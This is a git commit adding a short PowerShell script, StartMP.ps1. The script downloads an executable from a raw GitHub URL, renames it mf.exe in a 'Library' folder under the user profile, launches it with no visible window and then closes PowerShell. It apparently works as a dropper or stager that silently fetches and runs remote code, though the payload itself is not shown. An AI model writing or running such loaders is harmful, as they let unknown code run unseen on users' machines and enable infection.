c975e0eadec881fb501addbd8de9b6221a72cb70
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-10 12:01:05 -0600

    Create StartMP.ps1

---
+++ StartMP.ps1
@@ -0,0 +1,21 @@
+$url = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/MP.exe"
+$outputFolder = "$($env:USERPROFILE)\Library"
+$outputFile = "$outputFolder\mf.exe"
+
+# Create the folder if it doesn't exist
+if (-not (Test-Path $outputFolder)) {
+    New-Item -ItemType Directory -Path $outputFolder
+}
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+# Start the executable without a window
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $outputFile
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+[System.Diagnostics.Process]::Start($psi)
+
+# Close the PowerShell window
+exit
